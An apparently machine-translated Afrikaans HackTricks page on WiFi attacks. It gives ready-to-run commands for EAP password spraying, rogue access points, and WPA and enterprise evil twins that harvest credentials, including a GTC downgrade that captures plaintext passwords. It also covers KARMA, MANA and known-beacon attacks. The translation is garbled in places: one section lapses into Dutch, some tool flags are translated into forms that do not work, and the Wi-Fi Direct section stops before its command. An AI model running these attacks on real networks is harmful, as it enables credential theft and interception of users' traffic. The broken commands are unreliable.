![](<../../.gitbook/assets/image (150).png>)

### Anonieme Identiteite

Identiteitsversteek word ondersteun deur beide EAP-PEAP en EAP-TTLS. In die konteks van 'n WiFi-netwerk, word 'n EAP-Identity-versoek tipies deur die toegangspunt (AP) ge√Ønisieer tydens die assosiasieproses. Om die beskerming van gebruikersanonimiteit te verseker, bevat die respons van die EAP-klient op die toestel van die gebruiker slegs die noodsaaklike inligting wat nodig is vir die aanvanklike RADIUS-bedieners om die versoek te verwerk. Hierdie konsep word ge√Øllustreer deur die volgende scenario's:

* EAP-Identity = anoniem

- In hierdie scenario gebruik alle gebruikers die pseudonieme "anoniem" as hul gebruikersidentifiseerder. Die aanvanklike RADIUS-bediener funksioneer as 'n EAP-PEAP- of EAP-TTLS-bediener, wat verantwoordelik is vir die bestuur van die bedienerskant van die PEAP- of TTLS-protokol. Die binne (beskermde) verifikasiemetode word dan √≥f plaaslik hanteer √≥f aan 'n afgele√´ (tuis) RADIUS-bediener oorgedra.

* EAP-Identity = anoniem@realm_x

- In hierdie situasie verberg gebruikers uit verskillende domeine hul identiteite terwyl hulle hul onderskeie domeine aandui. Dit stel die aanvanklike RADIUS-bediener in staat om die EAP-PEAP- of EAP-TTLS-versoeke na RADIUS-bedieners in hul tuisdomeine te volmagtig, wat as die PEAP- of TTLS-bediener optree. Die aanvanklike RADIUS-bediener funksioneer slegs as 'n RADIUS-relaisnode.

- Alternatiewelik kan die aanvanklike RADIUS-bediener as die EAP-PEAP- of EAP-TTLS-bediener funksioneer en √≥f die beskermde verifikasiemetode hanteer √≥f dit na 'n ander bediener stuur. Hierdie opsie fasiliteer die konfigurasie van onderskeie beleide vir verskillende domeine.

In EAP-PEAP, sodra die TLS-tonnel tussen die PEAP-bediener en die PEAP-klient tot stand gebring is, inisieer die PEAP-bediener 'n EAP-Identity-versoek en stuur dit deur die TLS-tonnel. Die klient reageer op hierdie tweede EAP-Identity-versoek deur 'n EAP-Identity-respons te stuur wat die werklike identiteit van die gebruiker deur die versleutelde tonnel bevat. Hierdie benadering voorkom doeltreffend die bekendmaking van die werklike identiteit van die gebruiker aan enigiemand wat die 802.11-verkeer afluister.

EAP-TTLS volg 'n effens ander prosedure. Met EAP-TTLS verifieer die klient tipies deur PAP of CHAP te gebruik, wat deur die TLS-tonnel beveilig word. In hierdie geval sluit die klient 'n User-Name-eienskap en √≥f 'n Password- √≥f CHAP-Password-eienskap in die aanvanklike TLS-boodskap wat na tonnelvestiging gestuur word.

Ongeag die gekose protokol, verkry die PEAP/TTLS-bediener kennis van die werklike identiteit van die gebruiker nadat die TLS-tonnel tot stand gebring is. Die werklike identiteit kan voorgestel word as gebruiker@realm of eenvoudigweg gebruiker. As die PEAP/TTLS-bediener ook verantwoordelik is vir die verifikasie van die gebruiker, beskik dit nou oor die gebruiker se identiteit en gaan voort met die verifikasiemetode wat deur die TLS-tonnel beskerm word. Alternatiewelik kan die PEAP/TTLS-bediener 'n nuwe RADIUS-versoek na die gebruiker se tuis RADIUS-bediener stuur. Hierdie nuwe RADIUS-versoek laat die PEAP- of TTLS-protokollaag weg. In gevalle waar die beskermde verifikasiemetode EAP is, word die binne EAP-boodskappe sonder die EAP-PEAP- of EAP-TTLS-omhulling na die tuis RADIUS-bediener gestuur. Die User-Name-eienskap van die uitgaande RADIUS-boodskap bevat die werklike identiteit van die gebruiker en vervang die anonieme User-Name van die inkomende RADIUS-versoek. Wanneer die beskermde verifikasiemetode PAP of CHAP is (slegs ondersteun deur TTLS), word die User-Name en ander verifikasie-eienskappe wat uit die TLS-nutslading onttrek is, in die uitgaande RADIUS-boodskap vervang en verdring die anonieme User-Name- en TTLS EAP-Message-eienskappe wat in die inkomende RADIUS-versoek gevind word.

Vir meer inligting, besoek [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)


### EAP-Bruteforce (wagwoordspuit)

As daar verwag word dat die klient 'n gebruikersnaam en wagwoord gebruik (let daarop dat EAP-TLS in hierdie geval nie geldig sal wees nie), kan jy probeer om 'n lys van gebruikersname (sien volgende gedeelte) en wagwoorde te verkry en die toegang te probeer kraak met behulp van [air-hammer](https://github.com/Wh1t3Rh1n0/air-hammer).
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Jy kan ook hierdie aanval uitvoer met behulp van `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Kli√´ntaanvalle Teorie

### Netwerkkeuse en Roaming

- Die 802.11-protokol definieer hoe 'n stasie by 'n Uitgebreide Diensstel (ESS) aansluit, maar spesifiseer nie die kriteria vir die keuse van 'n ESS of 'n toegangspunt (AP) binne dit nie.
- Stasies kan tussen AP's wat dieselfde ESSID deel, rondswerf en konnektiwiteit regdeur 'n gebou of area handhaaf.
- Die protokol vereis stasie-outentisering aan die ESS, maar vereis nie AP-outentisering aan die stasie nie.

### Voorkeur Netwerklyste (PNL's)

- Stasies stoor die ESSID van elke draadlose netwerk waarmee hulle verbind in hul Voorkeur Netwerklyste (PNL), saam met netwerkspesifieke konfigurasiebesonderhede.
- Die PNL word gebruik om outomaties aan bekende netwerke te koppel, wat die gebruiker se ervaring verbeter deur die koppelingsproses te stroomlyn.

### Passiewe Skandering

- AP's versprei periodiek bakenskemas wat hul teenwoordigheid en kenmerke aankondig, insluitend die AP se ESSID tensy uitsending gedeaktiveer is.
- Tydens passiewe skandering luister stasies vir bakenskemas. As 'n baken se ESSID ooreenstem met 'n inskrywing in die stasie se PNL, kan die stasie outomaties aan daardie AP koppel.
- Kennis van 'n toestel se PNL maak potensi√´le uitbuiting moontlik deur 'n bekende netwerk se ESSID na te boots, wat die toestel laat koppel aan 'n bedrieglike AP.

### Aktiewe Ondersoek

- Aktiewe ondersoek behels dat stasies ondersoekversoeke stuur om nabygele√´ AP's en hul kenmerke te ontdek.
- Gerigte ondersoekversoeke teiken 'n spesifieke ESSID en help om vas te stel of 'n bepaalde netwerk binne bereik is, selfs as dit 'n verborge netwerk is.
- Uitsaai-ondersoekversoeke het 'n nul SSID-veld en word na alle nabygele√´ AP's gestuur, sodat die stasie kan kyk vir enige voorkeur netwerk sonder om sy PNL-inhoud bekend te maak.

## Eenvoudige AP met omleiding na die Internet

Voordat verduidelik word hoe om meer komplekse aanvalle uit te voer, sal dit verduidelik word **hoe** om net **'n AP** te **skep** en sy **verkeer** na 'n koppelvlak wat **aan** die **Internet** gekoppel is, te **omlei**.

Deur `ifconfig -a` te gebruik, kontroleer of die wlan-koppelvlak om die AP te skep en die koppelvlak wat aan die Internet gekoppel is, teenwoordig is.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Skep die konfigurasie l√™er `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Stel dan **IP-adresse** en **roetes** in:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
En dan **begin** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd

`hostapd` is 'n open source program wat gebruik word om 'n WiFi-toegangspunt (AP) te skep op 'n Linux-stelsel. Dit stel jou in staat om 'n draadlose netwerk te skep en te bestuur deur die gebruik van 'n draadlose netwerkkaart wat in monitor-modus kan werk.

`hostapd` kan gebruik word vir verskeie doeleindes, insluitend:

- Die skep van 'n privaat WiFi-netwerk vir jou eie gebruik.
- Die skep van 'n openbare WiFi-netwerk vir ander gebruikers om aan te sluit.
- Die skep van 'n geslote WiFi-netwerk vir spesifieke gebruikers of toestelle.

Om `hostapd` te gebruik, moet jy 'n konfigurasie-l√™er skep wat spesifiseer hoe die AP moet werk. Hier is 'n voorbeeld van 'n eenvoudige konfigurasie-l√™er:

```plaintext
interface=wlan0
driver=nl80211
ssid=MyWiFiNetwork
hw_mode=g
channel=6
```

In hierdie voorbeeld stel die `interface`-parameter die draadlose netwerkkaart in wat gebruik moet word, die `driver`-parameter spesifiseer die stuurprogram wat gebruik moet word, die `ssid`-parameter stel die naam van die WiFi-netwerk in, die `hw_mode`-parameter spesifiseer die draadlose standaard wat gebruik moet word, en die `channel`-parameter stel die kanaalnommer in waarop die AP moet werk.

Nadat jy die konfigurasie-l√™er geskep het, kan jy `hostapd` begin deur die volgende opdrag uit te voer:

```plaintext
sudo hostapd /path/to/config/file
```

Hierdie sal `hostapd` begin en die WiFi-toegangspunt skep volgens die spesifikasies in die konfigurasie-l√™er.

Dit is belangrik om te onthou dat die gebruik van `hostapd` om 'n WiFi-toegangspunt te skep, 'n gevorderde tegniek is en dat dit slegs op 'n wettige en etiese manier gebruik moet word.
```bash
apt-get install hostapd
```
Skep 'n konfigurasie l√™er `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stop irriterende prosesse**, stel **monitor modus** in, en **begin hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Deurstuur en Herlei

Om een succesvolle pentest uit te voeren op een WiFi-netwerk, is het belangrijk om de juiste technieken voor doorsturen en herleiden te begrijpen. Deze technieken stellen je in staat om verkeer van het doelwit om te leiden naar jouw eigen systeem, zodat je het kunt analyseren en manipuleren.

#### Doorsturen

Doorsturen is het proces waarbij al het verkeer dat naar een bepaald IP-adres of poort wordt gestuurd, wordt doorgestuurd naar een ander IP-adres of poort. Dit kan handig zijn bij het uitvoeren van een pentest, omdat je hiermee al het verkeer van het doelwit kunt onderscheppen en analyseren.

Om doorsturen in te stellen, kun je gebruik maken van tools zoals `iptables` op Linux of `netsh` op Windows. Hiermee kun je regels toevoegen aan de firewall-configuratie om het verkeer door te sturen naar jouw systeem.

#### Herleiden

Herleiden is het proces waarbij je verkeer van het ene IP-adres naar het andere IP-adres stuurt, terwijl je de bron- en bestemmingsadressen ongewijzigd laat. Dit kan handig zijn bij het uitvoeren van een pentest, omdat je hiermee verkeer kunt onderscheppen zonder dat het doelwit hiervan op de hoogte is.

Om herleiding in te stellen, kun je gebruik maken van tools zoals `arpspoof` op Linux of `Ettercap` op Windows. Deze tools stellen je in staat om het ARP-protocol te manipuleren, zodat al het verkeer van het doelwit naar jouw systeem wordt gestuurd.

Het begrijpen en beheersen van doorstuur- en herleidingstechnieken is essentieel voor een succesvolle pentest op een WiFi-netwerk. Door deze technieken toe te passen, kun je verkeer onderscheppen, analyseren en manipuleren om kwetsbaarheden in het netwerk te identificeren en te exploiteren.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Bosem Tweeling

'n Bosem tweeling-aanval maak gebruik van die manier waarop WiFi-kli√´nte netwerke herken, en steun hoofsaaklik op die netwerknaam (ESSID) sonder om die basisstasie (toegangspunt) te vereis om homself aan die kli√´nt te verifieer. Sleutelpunte sluit in:

- **Moeilikheid om te onderskei**: Toestelle sukkel om tussen legitieme en valse toegangspunte te onderskei wanneer hulle dieselfde ESSID en enkripsietipe deel. Werklike netwerke gebruik dikwels verskeie toegangspunte met dieselfde ESSID om dekking naadloos uit te brei.

- **Kli√´nt-roaming en verbindingsmanipulasie**: Die 802.11-protokol stel toestelle in staat om tussen toegangspunte binne dieselfde ESS te roteer. Aanvallers kan hiervan gebruik maak deur 'n toestel te verlei om van sy huidige basisstasie te ontkoppel en aan 'n valse een te koppel. Dit kan bereik word deur 'n sterker sein aan te bied of die verbinding met die legitieme toegangspunt te versteur deur metodes soos deauthenticatiepakkies of jamming.

- **Uitdagings in uitvoering**: Dit kan uitdagend wees om 'n bosem tweeling-aanval suksesvol uit te voer in omgewings met verskeie, goed geplaaste toegangspunte. Deauthentisering van 'n enkele legitieme toegangspunt lei dikwels daartoe dat die toestel aan 'n ander legitieme toegangspunt koppel, tensy die aanvaller al die nabygele√´ toegangspunte kan deauthentiseer of die valse toegangspunt strategisch kan plaas.

Jy kan 'n baie basiese Oop Bosem Tweeling (geen vermo√´ om verkeer na die internet te roeteer) skep deur die volgende te doen:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Jy kan ook 'n Boos Tweeling skep deur gebruik te maak van **eaphammer** (let daarop dat om bose tweelinge met eaphammer te skep, die koppelvlak **NIET** in **monitor**-modus moet wees):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Of deur Airgeddon te gebruik: `Opsies: 5,6,7,8,9 (binne die Evil Twin-aanvalsmenu).`

![](<../../.gitbook/assets/image (148).png>)

Let asseblief daarop dat as 'n ESSID in die PNL standaard as WPA beskerm word, sal die toestel nie outomaties verbind met 'n Oop evil twin nie. Jy kan probeer om die werklike AP te DoS en hoop dat die gebruiker handmatig sal verbind met jou Oop evil twin, of jy kan die werklike AP DoS en 'n WPA Evil Twin gebruik om die handshake vas te vang (met hierdie metode sal jy nie in staat wees om die slagoffer met jou te laat verbind nie, omdat jy die PSK nie ken nie, maar jy kan die handshake vasvang en probeer om dit te kraak).

_Sommige bedryfstelsels en AV sal die gebruiker waarsku dat dit gevaarlik is om met 'n Oop netwerk te verbind..._

### WPA/WPA2 Evil Twin

Jy kan 'n **Evil Twin skep met WPA/2** en as die toestelle gekonfigureer is om met daardie SSID met WPA/2 te verbind, sal hulle probeer om te verbind. In elk geval moet jy ook die **wagwoord** weet wat die kli√´nt gaan gebruik om die **4-weg-handshake te voltooi**. As jy dit **nie weet nie**, sal die **verbindig nie voltooi word nie**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Onderneming Boos Tweeling

Om hierdie aanvalle te verstaan, sal ek aanbeveel om eers die kort [WPA Enterprise verduideliking](./#wpa-enterprise-mgt) te lees.

**Met behulp van hostapd-wpe**

`hostapd-wpe` het 'n **konfigurasie** l√™er nodig om te werk. Om die generering van hierdie konfigurasies te **outomatiseer**, kan jy [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) gebruik (laai die python-l√™er binne _/etc/hostapd-wpe/_ af)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In die konfigurasie l√™er kan jy baie verskillende dinge kies soos ssid, kanaal, gebruikersl√™ers, sleutel, dh parameters, wpa weergawe en outentisering...

[**Die gebruik van hostapd-wpe met EAP-TLS om enige sertifikaat toe te laat om in te teken.**](evil-twin-eap-tls.md)

**Die gebruik van EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standaard stel EAPHammer hierdie verifikasiemetodes voor (merk op dat GTC as die eerste een gebruik word om platte teks wagwoorde te verkry en dan die gebruik van meer robuuste verifikasiemetodes):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dit is die verstek metodologie om lang verbindings tye te vermy. Jy kan egter ook spesifiseer dat die bediener die verifikasie metodes van swakste na sterkste moet hanteer:
```
--negotiate weakest
```
Of jy kan ook gebruik maak van:

* `--onderhandel gtc-afwaardering` om 'n hoogs effektiewe GTC-afwaardering implementering te gebruik (platte teks wagwoorde)
* `--onderhandel handmatig --fase-1-metodes PEAP,TTLS --fase-2-metodes MSCHAPV2,GTC,TTLS-PAP` om die metodes wat aangebied word handmatig te spesifiseer (deur dieselfde outentiseringsmetodes in dieselfde volgorde aan te bied as die organisasie, sal die aanval baie moeiliker wees om op te spoor).
* [Vind meer inligting in die wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Met behulp van Airgeddon**

`Airgeddon` kan voorheen gegenereerde sertifikate gebruik om EAP-outentisering aan te bied vir WPA/WPA2-Enterprise netwerke. Die vals netwerk sal die verbindingsprotokol afgradeer na EAP-MD5 sodat dit in staat sal wees om die gebruiker en die MD5 van die wagwoord vas te vang. Later kan die aanvaller probeer om die wagwoord te kraak.\
`Airggedon` bied jou die moontlikheid van 'n **voortdurende Evil Twin-aanval (lawaaierig)** of **slegs die Evil-aanval skep totdat iemand koppel (glad).**

![](<../../.gitbook/assets/image (129).png>)

### Debugging PEAP en EAP-TTLS TLS tonnels in Evil Twins aanvalle

_Hierdie metode is getoets in 'n PEAP-verbinding, maar aangesien ek 'n willekeurige TLS-tonnel ontsluit, behoort dit ook te werk met EAP-TTLS._

Binne die **konfigurasie** van _hostapd-wpe_ **kommentaar** die lyn wat _**dh\_file**_ bevat (van `dh_file=/etc/hostapd-wpe/certs/dh` tot `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dit sal `hostapd-wpe` laat toe om sleutels uit te ruil deur RSA te gebruik in plaas van DH, sodat jy die verkeer later kan **ontsluit** deur die bedieners se privaat sleutel te ken.

Begin nou die **Evil Twin** deur **`hostapd-wpe`** te gebruik met daardie gewysigde konfigurasie soos gewoonlik. Begin ook **`wireshark`** op die **koppelvlak** wat die Evil Twin-aanval uitvoer.

Nou of later (wanneer jy reeds 'n paar outentiseringspogings vasgevang het) kan jy die privaat RSA-sleutel byvoeg by wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Voeg 'n nuwe inskrywing by en vul die vorm in met hierdie waardes: **IP-adres = enige** -- **Poort = 0** -- **Protokol = data** -- **Sleutel l√™er** (**kies jou sleutel l√™er**, om probleme te voorkom, kies 'n sleutel l√™er **sonder wagwoordbeskerming**).

![](<../../.gitbook/assets/image (151).png>)

En kyk na die nuwe **"Decrypted TLS" tabblad**:

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Lawaaierige MANA en Bekende bakens aanval

### ESSID en MAC swart/witlys

Verskillende tipes Media Access Control Filterlyste (MFACLs) en hul ooreenstemmende modusse en effekte op die gedrag van 'n bedrieglike Toegangspunt (AP):

1. **MAC-gebaseerde Witlys**:
- Die bedrieglike AP sal slegs reageer op ondersoekversoeke van toestelle wat in die witlys gespesifiseer is, en onsigbaar bly vir almal wat nie gelys is nie.

2. **MAC-gebaseerde Swartlys**:
- Die bedrieglike AP sal ondersoekversoeke van toestelle op die swartlys ignoreer, en maak die bedrieglike AP effektief onsigbaar vir daardie spesifieke toestelle.

3. **ESSID-gebaseerde Witlys**:
- Die bedrieglike AP sal slegs reageer op ondersoekversoeke vir spesifieke ESSIDs wat gelys is, en maak dit onsigbaar vir toestelle waarvan die Voorkeur Netwerklyste (PNLs) nie daardie ESSIDs bevat nie.

4. **ESSID-gebaseerde Swartlys**:
- Die bedrieglike AP sal nie reageer op ondersoekversoeke vir die spesifieke ESSIDs op die swartlys nie, en maak dit onsigbaar vir toestelle wat daardie spesifieke netwerke soek.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hierdie metode stel 'n aanvaller in staat om 'n skadelike toegangspunt (AP) te skep wat reageer op alle ondersoekversoeke van toestelle wat probeer om aan netwerke te koppel. Hierdie tegniek mislei toestelle om aan die aanvaller se AP te koppel deur die netwerke na te boots wat die toestelle soek. Sodra 'n toestel 'n verbindingsversoek na hierdie valse AP stuur, voltooi dit die verbinding en lei dit die toestel om per ongeluk aan die aanvaller se netwerk te koppel.

### MANA

Daarna het toestelle begin om ongevraagde netwerkreaksies te ignoreer, wat die doeltreffendheid van die oorspronklike karma-aanval verminder het. 'n Nuwe metode, bekend as die MANA-aanval, is egter deur Ian de Villiers en Dominic White bekendgestel. Hierdie metode behels dat die valse AP die Voorkeur Netwerklyste (PNL) van toestelle vasvang deur te reageer op hul uitsaai-ondersoekversoeke met netwerkname (SSID's) wat voorheen deur die toestelle versoek is. Hierdie gesofistikeerde aanval omseil die beskerming teen die oorspronklike karma-aanval deur die manier waarop toestelle bekende netwerke onthou en prioriteer, uit te buit.

Die MANA-aanval werk deur beide gerigte en uitsaai-ondersoekversoeke van toestelle te monitor. Vir gerigte versoeke neem dit die toestel se MAC-adres en die versoekte netwerknaam op en voeg hierdie inligting by 'n lys. Wanneer 'n uitsaai-versoek ontvang word, reageer die AP met inligting wat ooreenstem met enige van die netwerke op die toestel se lys, om die toestel te verlei om aan die valse AP te koppel.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Luide MANA

'n **Luide MANA-aanval** is 'n gevorderde strategie vir wanneer toestelle nie gerigte ondersoek doen nie of wanneer hul Voorkeur Netwerklyste (PNL) onbekend is vir die aanvaller. Dit werk op die beginsel dat **toestelle in dieselfde area waarskynlik sommige netwerkname in hul PNLs deel**. In plaas daarvan om selektief te reageer, stuur hierdie aanval sondes wat vir elke netwerknaam (ESSID) uitgesaai word wat in die gekombineerde PNLs van alle waargenome toestelle gevind word. Hierdie bre√´ benadering verhoog die kans dat 'n toestel 'n bekende netwerk sal herken en sal probeer om met die bedrieglike Toegangspunt (AP) te verbind.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Bekende Beacon-aanval

Wanneer die **Luid MANA-aanval** nie voldoende is nie, bied die **Bekende Beacon-aanval** 'n ander benadering. Hierdie metode **brute-force die verbindingsproses deur 'n AP te simuleer wat reageer op enige netwerknaam, deur 'n lys potensi√´le ESSIDs af te loop** wat afgelei is van 'n woordelys. Dit simuleer die teenwoordigheid van verskeie netwerke in die hoop om 'n ESSID binne die slagoffer se PNL te vind, wat 'n verbindingspoging na die vervaardigde AP sal aanmoedig. Die aanval kan versterk word deur dit te kombineer met die `--loud` opsie vir 'n meer aggressiewe poging om toestelle te vang.

Eaphammer het hierdie aanval ge√Ømplementeer as 'n MANA-aanval waar al die ESSIDs binne 'n lys gelaai word (jy kan dit ook kombineer met `--loud` om 'n Luid MANA + Bekende beacons-aanval te skep):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bekende Beacon Burst-aanval**

Die **Bekende Beacon Burst-aanval** behels die **vinnige uitsending van bakenskemas vir elke ESSID wat in 'n l√™er gelys word**. Dit skep 'n digte omgewing van valse netwerke, wat die waarskynlikheid van toestelle wat aan die bedrieglike AP koppel, aansienlik verhoog, veral wanneer dit gekombineer word met 'n MANA-aanval. Hierdie tegniek maak gebruik van spoed en volume om toestelle se netwerkseleksiemeganismes te oorweldig.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direk

**Wi-Fi Direk** is 'n protokol wat toestelle in staat stel om direk met mekaar te skakel deur gebruik te maak van Wi-Fi sonder die nodigheid van 'n tradisionele draadlose toegangspunt. Hierdie vermo√´ is ge√Øntegreer in verskeie Internet of Things (IoT) toestelle, soos drukkers en televisies, wat direkte toestel-tot-toestel kommunikasie fasiliteer. 'n Noemenswaardige kenmerk van Wi-Fi Direk is dat een toestel die rol van 'n toegangspunt, bekend as die groep eienaar, aanneem om die verbinding te bestuur.

Veiligheid vir Wi-Fi Direk verbindinge word tot stand gebring deur **Wi-Fi Protected Setup (WPS)**, wat verskeie metodes ondersteun vir veilige koppeling, insluitend:
- **Drukknopkonfigurasie (PBC)**
- **PIN-invoer**
- **Naby-veld kommunikasie (NFC)**

Hierdie metodes, veral PIN-invoer, is vatbaar vir dieselfde kwesbaarhede as WPS in tradisionele Wi-Fi netwerke, wat hulle teikens maak vir soortgelyke aanvalsvektore.

### EvilDirect Kaping

**EvilDirect Kaping** is 'n aanval wat spesifiek is vir Wi-Fi Direk. Dit boots die konsep van 'n Evil Twin aanval na, maar teiken Wi-Fi Direk verbindinge. In hierdie scenario boots 'n aanvaller 'n legitieme groep eienaar na met die doel om toestelle te mislei om met 'n kwaadwillige entiteit te verbind. Hierdie metode kan uitgevoer word met behulp van gereedskap soos `airbase-ng` deur die kanaal, ESSID en MAC-adres van die nagebootsde toestel te spesifiseer:

## Verwysings

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Kyk na [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (aanmelding met Facebook en WPA nabootsing in kaptiewe portale)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutvinders!

**Hacking Insights**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack Nuus**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van real-time nuus en insigte

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutvindings wat bekendgestel word en noodsaaklike platform opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
